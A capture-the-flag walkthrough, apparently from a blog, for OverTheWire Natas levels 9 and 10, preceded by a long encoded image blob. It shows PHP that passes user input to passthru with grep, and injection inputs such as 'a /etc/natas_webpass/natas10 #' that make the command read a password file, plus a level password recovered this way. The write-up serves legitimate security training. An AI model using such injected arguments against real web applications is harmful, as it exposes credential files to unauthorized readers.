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)  

## Natas 9

  

    
    
     1  
     2  
     3  
     4  
     5  
     6  
     7  
     8  
     9  
    10  
    11

|

    
    
    <?  
    $key = "";  
      
    if(array_key_exists("needle", $_REQUEST)) {  
        $key = $_REQUEST["needle"];  
    }  
      
    if($key != "") {  
        passthru("grep -i $key dictionary.txt");  
    }  
    ?>  
      
  
---|---  
  
  
[passthru ](http://php.net/manual/en/function.passthru.php)is one of the PHP
functions that allows executing commands along with [exec
](http://php.net/manual/en/function.exec.php)and
[system](http://php.net/manual/en/function.system.php). Try entering any
character and you'll notice it's just grepping it from a dictionary.txt file.  
  
As we know from earlier, passwords are in /etc/natas_webpass/natasX, where X
is the level number. So we want it to run grep against
/etc/natas_webpass/natas10. How do we make this command behave the way we want
it to? By code injection.  
  
Using the pound symbol # allows us to terminate a bash command, example below:  
  
  

    
    
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9

|

    
    
    root@kali:~/Documents# ls  
    emptyfile  
    root@kali:~/Documents# whoami  
    root  
    root@kali:~/Documents# ls # whoami  
    emptyfile  
    root@kali:~/Documents# whoami # ls  
    root  
    root@kali:~/Documents#   
      
  
---|---  
  
  
By sending a random character (hoping it's in the password) followed by the
file we want to read and a pound key will do.  
  
Input: **a /etc/natas_webpass/natas10 #**  
  

## Natas 10

This challenge is quite similar to Natas 9, except that we can't use many
special characters.

  

  

    
    
     1  
     2  
     3  
     4  
     5  
     6  
     7  
     8  
     9  
    10  
    11  
    12  
    13  
    14  
    15

|

    
    
    <?  
    $key = "";  
      
    if(array_key_exists("needle", $_REQUEST)) {  
        $key = $_REQUEST["needle"];  
    }  
      
    if($key != "") {  
        if(preg_match('/[;|&]/',$key)) {  
            print "Input contains an illegal character!";  
        } else {  
            passthru("grep -i $key dictionary.txt");  
        }  
    }  
    ?>  
      
  
---|---  
  
  

Fortunately, our same exact approach works in this example too.

  1. **Input**: a /etc/natas_webpass/natas11 #  
**Output**: &lt;empty&gt;
  2. **Input**: b /etc/natas_webpass/natas11 #   
**Output**: &lt;empty&gt;
  3. **Input**: c /etc/natas_webpass/natas11 #   
**Output**: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

  


